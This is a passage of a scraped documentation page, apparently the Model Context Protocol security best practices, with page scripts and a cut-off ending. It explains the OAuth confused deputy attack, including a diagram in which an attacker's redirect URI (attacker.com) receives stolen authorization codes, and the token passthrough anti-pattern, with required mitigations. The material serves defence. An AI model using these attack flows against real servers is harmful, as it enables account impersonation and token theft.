gF69PdgrU7nYyZAbxVCHc36KNP\",\"/mintlify-assets/_next/static/chunks/589b24301b3a37b4.js?dpl=dpl_AdgF69PdgrU7nYyZAbxVCHc36KNP\",\"/mintlify-assets/_next/static/chunks/d2fedac44d815262.js?dpl=dpl_AdgF69PdgrU7nYyZAbxVCHc36KNP\",\"/mintlify-assets/_next/static/chunks/c3a3ab2374198660.js?dpl=dpl_AdgF69PdgrU7nYyZAbxVCHc36KNP\",\"/mintlify-assets/_next/static/chunks/de5d31edef447a03.js?dpl=dpl_AdgF69PdgrU7nYyZAbxVCHc36KNP\",\"/mintlify-assets/_next/static/chunks/6fb38247c19b3981.js?dpl=dpl_AdgF69PdgrU7nYyZAbxVCHc36KNP\",\"/mintlify-assets/_next/static/chunks/8176871b020d7070.js?dpl=dpl_AdgF69PdgrU7nYyZAbxVCHc36KNP\",\"/mintlify-assets/_next/static/chunks/9db9880c49eded60.js?dpl=dpl_AdgF69PdgrU7nYyZAbxVCHc36KNP\",\"/mintlify-assets/_next/static/chunks/41c8239ff6030cd1.js?dpl=dpl_AdgF69PdgrU7nYyZAbxVCHc36KNP\",\"/mintlify-assets/_next/static/chunks/e452a5c043e34035.js?dpl=dpl_AdgF69PdgrU7nYyZAbxVCHc36KNP\",\"/mintlify-assets/_next/static/chunks/fde44643dbef1bcd.js?dpl=dpl_AdgF69PdgrU7nYyZAbxVCHc36KNP\",\"/mintlify-assets/_next/static/chunks/c58283ba69dd38df.js?dpl=dpl_AdgF69PdgrU7nYyZAbxVCHc36KNP\",\"/mintlify-assets/_next/static/chunks/e5dcdb55f621f74a.js?dpl=dpl_AdgF69PdgrU7nYyZAbxVCHc36KNP\",\"/mintlify-assets/_next/static/chunks/1a0bf1d33a977db0.js?dpl=dpl_AdgF69PdgrU7nYyZAbxVCHc36KNP\"],\"default\"]\n"])</script><script>self.__next_f.push([1,"56:T1d2d,"])</script><script>self.__next_f.push([1,"// Version Warning Banner\n// Displays a warning banner on older spec and documentation versions and\n// on draft spec pages.\n//\n// Mintlify automatically loads all .js files in the docs directory, and\n// the site maintains /specification/latest/* and /docs/latest/* redirects\n// that always point to the current latest version of each section. We use\n// those redirects as the source of truth, so this script requires no\n// updates when a new version is published. Styling re-uses Mintlify's\n// native callout classes.\n\nconst DRAFT_VERSION = \"draft\";\nconst SECTIONS = [\n  {\n    pathRegex: /\\/specification\\/(\\d{4}-\\d{2}-\\d{2}|draft|latest)(\\/.*)?$/,\n    latestAliasPath: \"/specification/latest\",\n    storageKey: \"mcp-latest-spec-version\",\n    noun: \"specification\",\n    draftMessage: \"You are viewing a draft of a not-yet-finalized specification.\",\n  },\n  {\n    pathRegex: /\\/docs\\/(\\d{4}-\\d{2}-\\d{2}|draft|latest)(\\/.*)?$/,\n    latestAliasPath: \"/docs/latest\",\n    storageKey: \"mcp-latest-docs-version\",\n    noun: \"documentation\",\n    draftMessage:\n      \"You are viewing draft documentation for a not-yet-finalized specification.\",\n  },\n];\nconst BANNER_ATTR = \"data-spec-version-banner\";\n\nconst CALLOUT_CLASS_WARNING =\n  \"callout my-4 px-5 py-4 overflow-hidden rounded-2xl flex gap-3 \" +\n  \"border border-yellow-200 bg-yellow-50 \" +\n  \"dark:border-yellow-900 dark:bg-yellow-600/20 \" +\n  \"[\u0026_[data-component-part='callout-icon']]:mt-px\";\nconst CALLOUT_CLASS_INFO =\n  \"callout my-4 px-5 py-4 overflow-hidden rounded-2xl flex gap-3 \" +\n  \"border border-neutral-200 bg-neutral-50 \" +\n  \"dark:border-neutral-700 dark:bg-white/10\";\nconst CONTENT_CLASS_BASE =\n  \"text-sm prose dark:prose-invert min-w-0 w-full \" +\n  \"[\u0026_a]:!text-current [\u0026_a]:border-current [\u0026_strong]:!text-current \";\nconst CONTENT_CLASS_WARNING =\n  CONTENT_CLASS_BASE + \"text-yellow-800 dark:text-yellow-300\";\nconst CONTENT_CLASS_INFO =\n  CONTENT_CLASS_BASE + \"text-neutral-800 dark:text-neutral-300\";\nconst ICON_WRAPPER_CLASS = \"mt-0.5 w-4\";\n\nconst ICON_SVG_WARNING =\n  '\u003csvg class=\"flex-none size-5 text-yellow-800 dark:text-yellow-300\" ' +\n  'fill=\"none\" viewBox=\"0 0 24 24\" stroke=\"currentColor\" stroke-width=\"2\" ' +\n  'aria-label=\"Warning\"\u003e' +\n  '\u003cpath stroke-linecap=\"round\" stroke-linejoin=\"round\" ' +\n  'd=\"M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 ' +\n  \"4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z\" +\n  '\"\u003e\u003c/path\u003e\u003c/svg\u003e';\nconst ICON_SVG_INFO =\n  '\u003csvg class=\"flex-none size-5 text-neutral-800 dark:text-neutral-300\" ' +\n  'viewBox=\"0 0 20 20\" fill=\"currentColor\" aria-label=\"Info\"\u003e' +\n  '\u003cpath d=\"M8 0C3.58125 0 0 3.58125 0 8C0 12.4187 3.58125 16 8 ' +\n  \"16C12.4187 16 16 12.4187 16 8C16 3.58125 12.4187 0 8 0ZM8 14.5C4.41563 \" +\n  \"14.5 1.5 11.5841 1.5 8C1.5 4.41594 4.41563 1.5 8 1.5C11.5844 1.5 14.5 \" +\n  \"4.41594 14.5 8C14.5 11.5841 11.5844 14.5 8 14.5ZM9.25 10.5H8.75V7.75C8.75 \" +\n  \"7.3375 8.41563 7 8 7H7C6.5875 7 6.25 7.3375 6.25 7.75C6.25 8.1625 6.5875 \" +\n  \"8.5 7 8.5H7.25V10.5H6.75C6.3375 10.5 6 10.8375 6 11.25C6 11.6625 6.3375 \" +\n  \"12 6.75 12H9.25C9.66406 12 10 11.6641 10 11.25C10 10.8359 9.66563 10.5 \" +\n  \"9.25 10.5ZM8 6C8.55219 6 9 5.55219 9 5C9 4.44781 8.55219 4 8 4C7.44781 \" +\n  '4 7 4.44687 7 5C7 5.55313 7.44687 6 8 6Z\"\u003e\u003c/path\u003e\u003c/svg\u003e';\n\nfunction parseVersionedPath(pathname) {\n  for (const section of SECTIONS) {\n    const match = pathname.match(section.pathRegex);\n    if (match) return { section, version: match[1], subPath: match[2] || \"\" };\n  }\n  return null;\n}\n\nasync function resolveLatestVersion(section) {\n  const cached = sessionStorage.getItem(section.storageKey);\n  if (cached) return cached;\n\n  const response = await fetch(section.latestAliasPath, { method: \"HEAD\" });\n  const resolvedPath = new URL(response.url).pathname;\n  const match = resolvedPath.match(section.pathRegex);\n  const version = match ? match[1] : null;\n\n  if (version \u0026\u0026 version !== \"latest\") {\n    sessionStorage.setItem(section.storageKey, version);\n  }\n  return version;\n}\n\nfunction createBanner(message, linkHref, linkText, isDraft) {\n  const banner = document.createElement(\"div\");\n  banner.className = isDraft ? CALLOUT_CLASS_INFO : CALLOUT_CLASS_WARNING;\n  banner.setAttribute(\"role\", \"alert\");\n  banner.setAttribute(BANNER_ATTR, \"\");\n  banner.setAttribute(\"data-callout-type\", isDraft ? \"info\" : \"warning\");\n\n  const iconWrapper = document.createElement(\"div\");\n  iconWrapper.className = ICON_WRAPPER_CLASS;\n  iconWrapper.setAttribute(\"data-component-part\", \"callout-icon\");\n  iconWrapper.innerHTML = isDraft ? ICON_SVG_INFO : ICON_SVG_WARNING;\n\n  const content = document.createElement(\"div\");\n  content.className = isDraft ? CONTENT_CLASS_INFO : CONTENT_CLASS_WARNING;\n  content.setAttribute(\"data-component-part\", \"callout-content\");\n\n  const text = document.createElement(\"span\");\n  text.textContent = message + \" \";\n\n  const link = document.createElement(\"a\");\n  link.href = linkHref;\n  link.textContent = linkText;\n\n  content.appendChild(text);\n  content.appendChild(link);\n  banner.appendChild(iconWrapper);\n  banner.appendChild(content);\n\n  return banner;\n}\n\nlet inserting = false;\n\nasync function insertWarningBanner() {\n  if (inserting) return;\n  if (document.querySelector(`[${BANNER_ATTR}]`)) return;\n\n  const current = parseVersionedPath(window.location.pathname);\n  if (!current) return;\n\n  inserting = true;\n  try {\n    const latest = await resolveLatestVersion(current.section).catch(\n      () =\u003e null,\n    );\n    if (!latest || current.version === latest) return;\n\n    // Re-check after the await — a concurrent call may have already\n    // inserted a banner, or SPA navigation may have changed the page.\n    if (document.querySelector(`[${BANNER_ATTR}]`)) return;\n    if (\n      parseVersionedPath(window.location.pathname)?.version !== current.version\n    )\n      return;\n\n    const contentArea = document.querySelector(\n      \"#content-area, main, article, .content\",\n    );\n    if (!contentArea) return;\n\n    // Mintlify redirects \u003csection\u003e/latest/\u003csub-path\u003e to the actual\n    // version, so users land on the equivalent page in the latest version.\n    const latestHref = current.section.latestAliasPath + current.subPath;\n    const linkText = `View the latest version (${latest})`;\n\n    const isDraft = current.version === DRAFT_VERSION;\n    const message = isDraft\n      ? current.section.draftMessage\n      : `You are viewing an older version (${current.version}) of the ${current.section.noun}.`;\n\n    const banner = createBanner(message, latestHref, linkText, isDraft);\n\n    // Place the banner just below the page title block. Mintlify wraps\n    // the H1 in \u003cheader id=\"header\"\u003e; fall back to a raw \u003ch1\u003e or the\n    // top of the content area.\n    const header =\n      contentArea.querySelector(\"header#header\") ||\n      contentArea.querySelector(\"h1\");\n    if (header) {\n      header.insertAdjacentElement(\"afterend\", banner);\n    } else {\n      contentArea.insertBefore(banner, contentArea.firstChild);\n    }\n  } finally {\n    inserting = false;\n  }\n}\n\nif (document.readyState === \"loading\") {\n  document.addEventListener(\"DOMContentLoaded\", insertWarningBanner);\n} else {\n  insertWarningBanner();\n}\n\n// Re-insert after SPA navigation.\nconst observer = new MutationObserver(() =\u003e {\n  if (\n    !document.querySelector(`[${BANNER_ATTR}]`) \u0026\u0026\n    parseVersionedPath(window.location.pathname)\n  ) {\n    insertWarningBanner();\n  }\n});\nobserver.observe(document.body, { childList: true, subtree: true });\n"])</script><script>self.__next_f.push([1,"53:[\"$\",\"$L55\",null,{\"customJsDisabled\":false,\"jsFiles\":[{\"_id\":\"695e3c6e191f31176c7baf1d\",\"subdomain\":\"mcp\",\"filePath\":\"footer.js\",\"__v\":0,\"content\":\"// Custom footer copyright notice\\n(function() {\\n  function addCopyright() {\\n    const footer = document.querySelector('footer');\\n    if (footer \u0026\u0026 !document.getElementById('lf-copyright')) {\\n      const copyright = document.createElement('div');\\n      copyright.id = 'lf-copyright';\\n      copyright.innerHTML = 'Copyright © Model Context Protocol a Series of LF Projects, LLC.\u003cbr\u003eFor web site terms of use, trademark policy and other project policies please see \u003ca href=\\\"https://lfprojects.org\\\"\u003ehttps://lfprojects.org\u003c/a\u003e.';\\n      footer.appendChild(copyright);\\n    }\\n  }\\n\\n  // Run on initial load\\n  if (document.readyState === 'loading') {\\n    document.addEventListener('DOMContentLoaded', addCopyright);\\n  } else {\\n    addCopyright();\\n  }\\n\\n  // Handle SPA navigation\\n  const observer = new MutationObserver(addCopyright);\\n  observer.observe(document.body, { childList: true, subtree: true });\\n})();\\n\"},{\"_id\":\"6a68cddacf95a94df0024de5\",\"subdomain\":\"mcp\",\"filePath\":\"version-warning.js\",\"__v\":0,\"content\":\"$56\"}]}]\n"])</script><script>self.__next_f.push([1,"59:T10f5e,"])</script><script>self.__next_f.push([1,"\"use strict\";const{Fragment:_Fragment,jsx:_jsx,jsxs:_jsxs}=arguments[0];const{useMDXComponents:_provideComponents}=arguments[0];function _createMdxContent(props){const _components={a:`a`,code:`code`,em:`em`,h5:`h5`,li:`li`,ol:`ol`,p:`p`,pre:`pre`,span:`span`,strong:`strong`,ul:`ul`,..._provideComponents(),...props.components},{CodeBlock,Heading,Mermaid,Note}=_components;if(!CodeBlock)_missingMdxReference(`CodeBlock`,true);if(!Heading)_missingMdxReference(`Heading`,true);if(!Mermaid)_missingMdxReference(`Mermaid`,true);if(!Note)_missingMdxReference(`Note`,true);return _jsxs(_Fragment,{children:[_jsx(Heading,{level:`2`,id:`introduction`,children:`Introduction`}),`\n`,_jsx(Heading,{level:`3`,id:`purpose-and-scope`,children:`Purpose and Scope`}),`\n`,_jsxs(_components.p,{children:[`This document provides security considerations for the Model Context\nProtocol (MCP), complementing the\n`,_jsx(_components.a,{href:`/specification/latest/basic/authorization`,children:`MCP Authorization`}),`\nspecification. This document identifies security risks, attack vectors,\nand best practices specific to MCP implementations.`]}),`\n`,_jsxs(_components.p,{children:[`The primary audience for this document includes developers implementing\nMCP authorization flows, MCP server operators, and security\nprofessionals evaluating MCP-based systems. This document should be read\nalongside the MCP Authorization specification and\n`,_jsx(_components.a,{href:`https://datatracker.ietf.org/doc/html/rfc9700`,children:`OAuth 2.0 security best practices`}),`.`]}),`\n`,_jsx(Heading,{level:`2`,id:`attacks-and-mitigations`,children:`Attacks and Mitigations`}),`\n`,_jsx(_components.p,{children:`This section gives a detailed description of attacks on MCP\nimplementations, along with potential countermeasures.`}),`\n`,_jsx(Heading,{level:`3`,id:`confused-deputy-problem`,children:`Confused Deputy Problem`}),`\n`,_jsxs(_components.p,{children:[`Attackers can exploit MCP proxy servers that connect to third-party\nAPIs, creating\n“`,_jsx(_components.a,{href:`https://en.wikipedia.org/wiki/Confused_deputy_problem`,children:`confused deputy`}),`”\nvulnerabilities. This attack allows malicious clients to obtain\nauthorization codes without proper user consent by exploiting the\ncombination of static client IDs, dynamic client registration, and\nconsent cookies.`]}),`\n`,_jsx(Heading,{level:`4`,id:`terminology`,children:`Terminology`}),`\n`,_jsxs(_components.p,{children:[_jsx(_components.strong,{children:`MCP Proxy Server`}),`\n: An MCP server that connects MCP clients to third-party APIs, offering\nMCP features while delegating operations and acting as a single OAuth\nclient to the third-party API server.`]}),`\n`,_jsxs(_components.p,{children:[_jsx(_components.strong,{children:`Third-Party Authorization Server`}),`\n: Authorization server that protects the third-party API. It may lack\ndynamic client registration support, requiring the MCP proxy to use a\nstatic client ID for all requests.`]}),`\n`,_jsxs(_components.p,{children:[_jsx(_components.strong,{children:`Third-Party API`}),`\n: The protected resource server that provides the actual API\nfunctionality. Access to this API requires tokens issued by the\nthird-party authorization server.`]}),`\n`,_jsxs(_components.p,{children:[_jsx(_components.strong,{children:`Static Client ID`}),`\n: A fixed OAuth 2.0 client identifier used by the MCP proxy server when\ncommunicating with the third-party authorization server. This Client ID\nrefers to the MCP server acting as a client to the Third-Party API. It\nis the same value for all MCP server to Third-Party API interactions\nregardless of which MCP client initiated the request.`]}),`\n`,_jsx(Heading,{level:`4`,id:`vulnerable-conditions`,children:`Vulnerable Conditions`}),`\n`,_jsx(_components.p,{children:`This attack becomes possible when all of the following conditions are\npresent:`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`MCP proxy server uses a `,_jsx(_components.strong,{children:`static client ID`}),` with a third-party\nauthorization server`]}),`\n`,_jsxs(_components.li,{children:[`MCP proxy server allows MCP clients to `,_jsx(_components.strong,{children:`dynamically register`}),` (each\ngetting their own client_id)`]}),`\n`,_jsxs(_components.li,{children:[`The third-party authorization server sets a `,_jsx(_components.strong,{children:`consent cookie`}),` after\nthe first authorization`]}),`\n`,_jsx(_components.li,{children:`MCP proxy server does not implement proper per-client consent before\nforwarding to third-party authorization`}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`architecture-and-attack-flows`,children:`Architecture and Attack Flows`}),`\n`,_jsx(_components.h5,{children:`Normal OAuth proxy usage (preserves user consent)`}),`\n`,_jsx(Mermaid,{chart:`sequenceDiagram\n    participant UA as User-Agent (Browser)\n    participant MC as MCP Client\n    participant M as MCP Proxy Server\n    participant TAS as Third-Party Authorization Server\n\n    Note over UA,M: Initial Auth flow completed\n\n    Note over UA,TAS: Step 1: Legitimate user consent for Third Party Server\n\n    M-\u003e\u003eUA: Redirect to third party authorization server\n    UA-\u003e\u003eTAS: Authorization request (client_id: mcp-proxy)\n    TAS-\u003e\u003eUA: Authorization consent screen\n    Note over UA: Review consent screen\n    UA-\u003e\u003eTAS: Approve\n    TAS-\u003e\u003eUA: Set consent cookie for client ID: mcp-proxy\n    TAS-\u003e\u003eUA: 3P Authorization code + redirect to mcp-proxy-server.com\n    UA-\u003e\u003eM: 3P Authorization code\n    Note over M,TAS: Exchange 3P code for 3P token\n    Note over M: Generate MCP authorization code\n    M-\u003e\u003eUA: Redirect to MCP Client with MCP authorization code\n\n    Note over M,UA: Exchange code for token, etc.`}),`\n`,_jsx(_components.h5,{children:`Malicious OAuth proxy usage (skips user consent)`}),`\n`,_jsx(Mermaid,{chart:`sequenceDiagram\n    participant UA as User-Agent (Browser)\n    participant M as MCP Proxy Server\n    participant TAS as Third-Party Authorization Server\n    participant A as Attacker\n\n\n    Note over UA,A: Step 2: Attack (leveraging existing cookie, skipping consent)\n    A-\u003e\u003eM: Dynamically register malicious client, redirect_uri: attacker.com\n    A-\u003e\u003eUA: Sends malicious link\n    UA-\u003e\u003eTAS: Authorization request (client_id: mcp-proxy) + consent cookie\n    rect rgba(255, 17, 0, 0.67)\n    TAS-\u003e\u003eTAS: Cookie present, consent skipped\n    end\n\n   TAS-\u003e\u003eUA: 3P Authorization code + redirect to mcp-proxy-server.com\n   UA-\u003e\u003eM: 3P Authorization code\n   Note over M,TAS: Exchange 3P code for 3P token\n   Note over M: Generate MCP authorization code\n   M-\u003e\u003eUA: Redirect to attacker.com with MCP Authorization code\n   UA-\u003e\u003eA: MCP Authorization code delivered to attacker.com\n   Note over M,A: Attacker exchanges MCP code for MCP token\n   A-\u003e\u003eM: Attacker impersonates user to MCP server`}),`\n`,_jsx(Heading,{level:`4`,id:`attack-description`,children:`Attack Description`}),`\n`,_jsx(_components.p,{children:`When an MCP proxy server uses a static client ID to authenticate with\na third-party authorization server, the following attack becomes\npossible:`}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsx(_components.li,{children:`A user authenticates normally through the MCP proxy server to access\nthe third-party API`}),`\n`,_jsx(_components.li,{children:`During this flow, the third-party authorization server sets a cookie\non the user agent indicating consent for the static client ID`}),`\n`,_jsx(_components.li,{children:`An attacker later sends the user a malicious link containing a\ncrafted authorization request which contains a malicious redirect URI\nalong with a new dynamically registered client ID`}),`\n`,_jsx(_components.li,{children:`When the user clicks the link, their browser still has the consent\ncookie from the previous legitimate request`}),`\n`,_jsx(_components.li,{children:`The third-party authorization server detects the cookie and skips the\nconsent screen`}),`\n`,_jsxs(_components.li,{children:[`The MCP authorization code is redirected to the attacker’s server\n(specified in the malicious `,_jsx(_components.code,{children:`redirect_uri`}),` parameter during\n`,_jsx(_components.a,{href:`/specification/latest/basic/authorization#dynamic-client-registration`,children:`dynamic client registration`}),`)`]}),`\n`,_jsx(_components.li,{children:`The attacker exchanges the stolen authorization code for access\ntokens for the MCP server without the user’s explicit approval`}),`\n`,_jsx(_components.li,{children:`The attacker now has access to the third-party API as the compromised\nuser`}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation`,children:`Mitigation`}),`\n`,_jsxs(_components.p,{children:[`To prevent confused deputy attacks, MCP proxy servers `,_jsx(_components.strong,{children:`MUST`}),` implement\nper-client consent and proper security controls as detailed below.`]}),`\n`,_jsx(_components.h5,{children:`Consent Flow Implementation`}),`\n`,_jsxs(_components.p,{children:[`The following diagram shows how to properly implement per-client consent\nthat runs `,_jsx(_components.strong,{children:`before`}),` the third-party authorization flow:`]}),`\n`,_jsx(Mermaid,{chart:`sequenceDiagram\n    participant Client as MCP Client\n    participant Browser as User's Browser\n    participant MCP as MCP Server\n    participant ThirdParty as Third-Party AuthZ Server\n\n    Note over Client,ThirdParty: 1. Client Registration (Dynamic)\n    Client-\u003e\u003eMCP: Register with redirect_uri\n    MCP--\u003e\u003eClient: client_id\n\n    Note over Client,ThirdParty: 2. Authorization Request\n    Client-\u003e\u003eBrowser: Open MCP server authorization URL\n    Browser-\u003e\u003eMCP: GET /authorize?client_id=...\u0026redirect_uri=...\n\n    alt Check MCP Server Consent\n        MCP-\u003e\u003eMCP: Check consent for this client_id\n        Note over MCP: Not previously approved\n    end\n\n    MCP-\u003e\u003eBrowser: Show MCP server-owned consent page\n    Note over Browser: \"Allow [Client Name] to access [Third-Party API]?\"\n    Browser-\u003e\u003eMCP: POST /consent (approve)\n    MCP-\u003e\u003eMCP: Store consent decision for client_id\n\n    Note over Client,ThirdParty: 3. Forward to Third-Party\n    MCP-\u003e\u003eBrowser: Redirect to third-party /authorize\n    Note over MCP: Use static client_id for third-party\n\n    Browser-\u003e\u003eThirdParty: Authorization request (static client_id)\n    ThirdParty-\u003e\u003eBrowser: User authenticates \u0026 consents\n    ThirdParty-\u003e\u003eBrowser: Redirect with auth code\n\n    Browser-\u003e\u003eMCP: Callback with third-party code\n    MCP-\u003e\u003eThirdParty: Exchange code for token (using static client_id)\n    MCP-\u003e\u003eBrowser: Redirect to client's registered redirect_uri`}),`\n`,_jsx(_components.h5,{children:`Required Protections`}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Per-Client Consent Storage`})}),`\n`,_jsxs(_components.p,{children:[`MCP proxy servers `,_jsx(_components.strong,{children:`MUST`}),`:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Maintain a registry of approved `,_jsx(_components.code,{children:`client_id`}),` values per user`]}),`\n`,_jsxs(_components.li,{children:[`Check this registry `,_jsx(_components.strong,{children:`before`}),` initiating the third-party\nauthorization flow`]}),`\n`,_jsx(_components.li,{children:`Store consent decisions securely (server-side database, or server\nspecific cookies)`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Consent UI Requirements`})}),`\n`,_jsxs(_components.p,{children:[`The MCP-level consent page `,_jsx(_components.strong,{children:`MUST`}),`:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Clearly identify the requesting MCP client by name`}),`\n`,_jsx(_components.li,{children:`Display the specific third-party API scopes being requested`}),`\n`,_jsxs(_components.li,{children:[`Show the registered `,_jsx(_components.code,{children:`redirect_uri`}),` where tokens will be sent`]}),`\n`,_jsx(_components.li,{children:`Implement CSRF protection (e.g., state parameter, CSRF tokens)`}),`\n`,_jsxs(_components.li,{children:[`Prevent iframing via `,_jsx(_components.code,{children:`frame-ancestors`}),` CSP directive or\n`,_jsx(_components.code,{children:`X-Frame-Options: DENY`}),` to prevent clickjacking`]}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Consent Cookie Security`})}),`\n`,_jsxs(_components.p,{children:[`If using cookies to track consent decisions, they `,_jsx(_components.strong,{children:`MUST`}),`:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Use `,_jsx(_components.code,{children:`__Host-`}),` prefix for cookie names`]}),`\n`,_jsxs(_components.li,{children:[`Set `,_jsx(_components.code,{children:`Secure`}),`, `,_jsx(_components.code,{children:`HttpOnly`}),`, and `,_jsx(_components.code,{children:`SameSite=Lax`}),` attributes`]}),`\n`,_jsx(_components.li,{children:`Be cryptographically signed or use server-side sessions`}),`\n`,_jsxs(_components.li,{children:[`Bind to the specific `,_jsx(_components.code,{children:`client_id`}),` (not just “user has consented”)`]}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`Redirect URI Validation`})}),`\n`,_jsxs(_components.p,{children:[`The MCP proxy server `,_jsx(_components.strong,{children:`MUST`}),`:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Validate that the `,_jsx(_components.code,{children:`redirect_uri`}),` in authorization requests exactly\nmatches the registered URI`]}),`\n`,_jsxs(_components.li,{children:[`Reject requests if the `,_jsx(_components.code,{children:`redirect_uri`}),` has changed without\nre-registration`]}),`\n`,_jsx(_components.li,{children:`Use exact string matching (not pattern matching or wildcards)`}),`\n`]}),`\n`,_jsx(_components.p,{children:_jsx(_components.strong,{children:`OAuth State Parameter Validation`})}),`\n`,_jsxs(_components.p,{children:[`The OAuth `,_jsx(_components.code,{children:`state`}),` parameter is critical to prevent authorization code\ninterception and CSRF attacks. Proper state validation ensures that\nconsent approval at the authorization endpoint is enforced at the\ncallback endpoint.`]}),`\n`,_jsxs(_components.p,{children:[`MCP proxy servers implementing OAuth flows `,_jsx(_components.strong,{children:`MUST`}),`:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[`Generate a cryptographically secure random `,_jsx(_components.code,{children:`state`}),` value for each\nauthorization request`]}),`\n`,_jsxs(_components.li,{children:[`Store the `,_jsx(_components.code,{children:`state`}),` value server-side (in a secure session store or\nencrypted cookie) `,_jsx(_components.strong,{children:`only after`}),` consent has been explicitly approved`]}),`\n`,_jsxs(_components.li,{children:[`Set the `,_jsx(_components.code,{children:`state`}),` tracking cookie/session `,_jsx(_components.strong,{children:`immediately before`}),`\nredirecting to the third-party identity provider (not before consent\napproval)`]}),`\n`,_jsxs(_components.li,{children:[`Validate at the callback endpoint that the `,_jsx(_components.code,{children:`state`}),` query parameter\nexactly matches the stored value in the callback request’s cookies or\nin the request’s cookie-based session`]}),`\n`,_jsxs(_components.li,{children:[`Reject any callback requests where the `,_jsx(_components.code,{children:`state`}),` parameter is missing\nor does not match`]}),`\n`,_jsxs(_components.li,{children:[`Ensure `,_jsx(_components.code,{children:`state`}),` values are single-use (delete after validation) and\nhave a short expiration time (e.g., 10 minutes)`]}),`\n`]}),`\n`,_jsxs(_components.p,{children:[`The consent cookie or session containing the `,_jsx(_components.code,{children:`state`}),` value `,_jsx(_components.strong,{children:`MUST NOT`}),`\nbe set until `,_jsx(_components.strong,{children:`after`}),` the user has approved the consent screen at the\nMCP server’s authorization endpoint. Setting this cookie before consent\napproval renders the consent screen ineffective, as an attacker could\nbypass it by crafting a malicious authorization request.`]}),`\n`,_jsx(Heading,{level:`3`,id:`token-passthrough`,children:`Token Passthrough`}),`\n`,_jsxs(_components.p,{children:[`“Token passthrough” is an anti-pattern where an MCP server accepts\ntokens from an MCP client without validating that the tokens were\nproperly issued `,_jsx(_components.em,{children:`to the MCP server`}),` and passes them through to the\ndownstream API.`]}),`\n`,_jsx(_components.p,{children:`An attacker can gain unauthorized access or otherwise compromise an\nMCP server if the server accepts tokens issued for other resources.\nThis vulnerability has two critical dimensions:`}),`\n`,_jsxs(_components.ol,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Audience validation failures.`}),` When an MCP server doesn’t verify\nthat tokens were specifically intended for it (for example, via the\naudience claim, as mentioned in\n`,_jsx(_components.a,{href:`https://www.rfc-editor.org/rfc/rfc9068.html`,children:`RFC9068`}),`), it may\naccept tokens originally issued for other services. This breaks a\nfundamental OAuth security boundary, allowing attackers to reuse\nlegitimate tokens across different services than intended.`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Token passthrough.`}),` If the MCP server not only accepts tokens\nwith incorrect audiences but also forwards these unmodified tokens\nto downstream services, it can potentially cause the\n`,_jsx(_components.a,{href:`#confused-deputy-problem`,children:`“confused deputy” problem`}),`, where the\ndownstream API may incorrectly trust the token as if it came from\nthe MCP server or assume the token was validated by the upstream\nAPI.`]}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`risks`,children:`Risks`}),`\n`,_jsxs(_components.p,{children:[`Token passthrough is explicitly forbidden in the\n`,_jsx(_components.a,{href:`/specification/latest/basic/authorization`,children:`authorization specification`}),`\nas it introduces a number of security risks, that include:`]}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Security Control Circumvention`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`The MCP Server or downstream APIs might implement important security\ncontrols like rate limiting, request validation, or traffic\nmonitoring, that depend on the token audience or other credential\nconstraints. If clients can obtain and use tokens directly with the\ndownstream APIs without the MCP server validating them properly or\nensuring that the tokens are issued for the right service, they\nbypass these controls.`}),`\n`]}),`\n`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Accountability and Audit Trail Issues`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`The MCP Server will be unable to identify or distinguish between MCP\nClients when clients are calling with an upstream-issued access token\nwhich may be opaque to the MCP Server.`}),`\n`,_jsx(_components.li,{children:`The downstream Resource Server’s logs may show requests that appear\nto come from a different source with a different identity, rather\nthan the MCP server that is actually forwarding the tokens.`}),`\n`,_jsx(_components.li,{children:`Both factors make incident investigation, controls, and auditing\nmore difficult.`}),`\n`,_jsx(_components.li,{children:`If the MCP Server passes tokens without validating their claims\n(e.g., roles, privileges, or audience) or other metadata, a\nmalicious actor in possession of a stolen token can use the server\nas a proxy for data exfiltration.`}),`\n`]}),`\n`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Trust Boundary Issues`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`The downstream Resource Server grants trust to specific entities.\nThis trust might include assumptions about origin or client behavior\npatterns. Breaking this trust boundary could lead to unexpected\nissues.`}),`\n`,_jsx(_components.li,{children:`If the token is accepted by multiple services without proper\nvalidation, an attacker compromising one service can use the token\nto access other connected services.`}),`\n`]}),`\n`]}),`\n`,_jsxs(_components.li,{children:[_jsx(_components.strong,{children:`Future Compatibility Risk`}),`\n`,_jsxs(_components.ul,{children:[`\n`,_jsx(_components.li,{children:`Even if an MCP Server starts as a “pure proxy” today, it might need\nto add security controls later. Starting with proper token audience\nseparation makes it easier to evolve the security model.`}),`\n`]}),`\n`]}),`\n`]}),`\n`,_jsx(Heading,{level:`4`,id:`mitigation-2`,children:`Mitigation`}),`\n`,_jsxs(_components.p,{children:[`MCP servers `,_jsx(_components.strong,{children:`MUST NOT`}),` accept any tokens that were not explicitly\nissued for the MCP server.`]}),`\n`,_jsx(Heading,{level:`3`,id:`server-side-request-forgery-ssrf`,children:`Server-Side Request Forgery 